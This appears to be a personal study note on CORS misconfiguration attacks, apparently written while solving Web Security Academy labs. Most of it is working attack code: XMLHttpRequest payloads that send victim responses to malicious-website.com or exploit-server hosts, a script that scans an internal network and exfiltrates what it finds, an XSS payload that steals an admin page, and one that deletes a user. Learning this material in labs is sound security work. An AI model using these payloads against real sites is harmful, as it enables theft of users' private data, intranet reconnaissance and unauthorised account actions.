# Cross-origin resource sharing (CORS)
CORS is a browser mechanism which enables controlled access to resources located outside of a given domain. It's used to to extend same-origin policy.  
## Same-origin policy
SOP restritcs ability of website to interact with resources outside of source domain. It's very restrictive. CORS protocol uses suite of HTTP headers that defines trusted web origins and associated properties (such as auth access)
## Server-generated ACAO header from client-specified Origin header
ACAO - Access-Control-Allow-Origin header  
This is an issue when server generates Allow-Origin from clients request. It's simply no protection, because it will accept any domain as origin and just copy it to ACAO header.  
In such case:
```
Request:
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```
We can host such script on our website to retrieve sensitive data:
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
```
## Errors in origins whitelist
usual:
```
normal-website.com
hackersnormal-website.com
normal-website.com.evil-user.net
```
## Whitelisted null origin value
Some applications might whitelist the `null` origin to support local development of the application.  
In this situation attacker can use tricks to generated cross-origin request containing null origin. For example this could be done with sandboxed iframe:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```
idk why, but `src="data...` doesn't work. In place of it use:
```
srcdoc="<script>...</script>"
```
## XSS via CORS
If site trusts some subdomain which is vulnerable to XSS, we can use URL like this:
```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```
## Breaking TLS with poorly configured CORS 
We can detect that website reflects any subdomain in ACAO header regardless protocol.  
In such case we need to detect which endpoint of sute uses HTTP and try to exploit XSS on it  
Then:
```
<script>
    document.location="http://stock.0a2f00a40350fcf1c11785b000d500ee.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onload = reqListener; req.open('get','https://0a2f00a40350fcf1c11785b000d500ee.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://exploit-0a930014030dfc71c11e84f601550032.exploit-server.net/log?data='%2bthis.responseText; };;%3c/script>&storeId=1"
</script>
```
## Intranets and CORS without credentials 
Most CORS attacks rely on the presence of the response header: 
```
Access-Control-Allow-Credentials: true
```
Without that header, the victim user's browser will refuse to send their cookies  
In such case we can try to access inner private network:
```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```
If users within the private IP address space access the public internet then a CORS-based attack can be performed from the external site that uses the victim's browser as a proxy for accessing intranet resources.  

### Script for scanning inner network:
```
<script>
        var q = [], collaboratorURL = 'http://exploit-0a7f00490417a1aac052b207013a00cb.exploit-server.net/log';

        for(i=1;i<=255;i++) {
            q.push(function(url) {
                return function(wait) {
                    fetchUrl(url, wait);
                }
            }('http://192.168.0.'+i+':8080'));
        }

        for(i=1;i<=20;i++){
            if(q.length)q.shift()(i*100);
        }

        function fetchUrl(url, wait) {
            var controller = new AbortController(), signal = controller.signal;
            fetch(url, {signal}).then(r => r.text().then(text => {
                location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
            }))
            .catch(e => {
                if(q.length) {
                    q.shift()(wait);
                }
            });
            setTimeout(x => {
                controller.abort();
                if(q.length) {
                    q.shift()(wait);
                }
            }, wait);
        }
        </script>
```
XSS
```
<script>
            function xss(url, text, vector) {
                location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
            }

            function fetchUrl(url, collaboratorURL){
                fetch(url).then(r=>r.text().then(text=>
                {
                    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
                }
                ))
            }

            fetchUrl("http://192.168.0.28:8080", "http://exploit-0a7f00490417a1aac052b207013a00cb.exploit-server.net/log");
        </script>
```
## Delete user
```
       <script>
            function xss(url, text, vector) {
                location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
            }

            function fetchUrl(url){
                fetch(url).then(r=>r.text().then(text=>
                {
                xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
                }
                ))
            }

            fetchUrl("http://192.168.0.28:8080");
        </script>
```
